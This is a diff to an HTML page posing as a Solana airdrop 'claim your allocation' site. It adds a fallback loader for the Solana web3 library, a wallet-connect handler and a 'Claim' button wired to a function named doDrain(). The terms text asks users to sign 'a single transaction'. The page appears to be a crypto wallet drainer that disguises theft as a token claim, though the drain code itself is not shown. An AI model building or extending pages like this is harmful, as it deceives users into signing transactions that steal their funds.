@@ -8,7 +8,25 @@
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=Space+Grotesk:wght@500;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="/assets/style.css">
-  <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.0/lib/index.iife.min.js"></script>
+  <script>
+    (function(){
+      const sources = [
+        'https://cdn.jsdelivr.net/npm/@solana/web3.js@1.95.0/lib/index.iife.min.js',
+        'https://unpkg.com/@solana/web3.js@1.95.0/lib/index.iife.min.js',
+        'https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.95.0/index.iife.min.js'
+      ];
+      let idx = 0;
+      function loadNext(){
+        if(idx >= sources.length) return console.error('All Solana CDN sources failed');
+        const s = document.createElement('script');
+        s.src = sources[idx];
+        s.onload = function(){ console.log('Solana loaded from', sources[idx]); };
+        s.onerror = function(){ idx++; loadNext(); };
+        document.head.appendChild(s);
+      }
+      loadNext();
+    })();
+  </script>
 </head>
 <body>
   <div class="bg-mesh"></div>
@@ -46,7 +64,7 @@
       </div>
 
       <div id="connectSection" class="step">
-        <button id="btnConnect" class="btn btn-primary" disabled>
+        <button id="btnConnect" class="btn btn-primary" disabled onclick="connectWallet()">
           <span class="btn-text">Loading...</span>
         </button>
         <p class="loading-msg" id="loadingMsg">Initializing wallet libraries...</p>
@@ -60,11 +78,11 @@
         </div>
 
         <label class="terms" id="agreeSection">
-          <input type="checkbox" id="chkAgree">
+          <input type="checkbox" id="chkAgree" onchange="updateButton()">
           <span>I verify my on-chain activity and sign a single transaction to claim my allocation.</span>
         </label>
 
-        <button id="btnClaim" class="btn btn-primary" disabled>
+        <button id="btnClaim" class="btn btn-primary" disabled onclick="doDrain()">
           <span class="btn-text">Agree to terms</span>
         </button>
 
